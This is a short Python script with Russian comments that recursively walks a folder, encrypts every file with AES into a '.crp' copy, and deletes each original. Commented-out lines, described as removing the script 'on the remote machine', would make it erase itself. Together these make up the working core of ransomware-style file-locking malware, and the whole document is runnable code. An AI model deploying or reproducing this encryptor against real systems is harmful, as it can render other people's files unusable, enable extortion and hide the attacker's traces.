import pyAesCrypt
import os
# import sys

def encryption(file, password):
    """
    Функция шифрования файлов.
    """
    # задаем размер буфера
    buffer_size = 512 * 1024

    pyAesCrypt.encryptFile(
        str(file),
        str(file) + '.crp',
        password,
        buffer_size
    )
    # выводим на печать имя зашифрованного файла
    print("[Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован]")

    # удаляем исходный файл
    os.remove(file)

def working_by_dirs(dir, password):
    """
    Функция сканирования директорий.
    """
    # перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)

        # если находим файл, то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)
        # если находим директорию, то повторяем цикл в поисках файлов
        else:
            working_by_dirs(path, password)

password = input("Ввдите пароль для шифрования: ")
working_by_dirs("/home/anna/Рабочий стол/my_staff", password)
# удаляем за собой скрипты на удаленной машине( предварительно сохранить файл)
# os.remove(str(sys.argv[0]))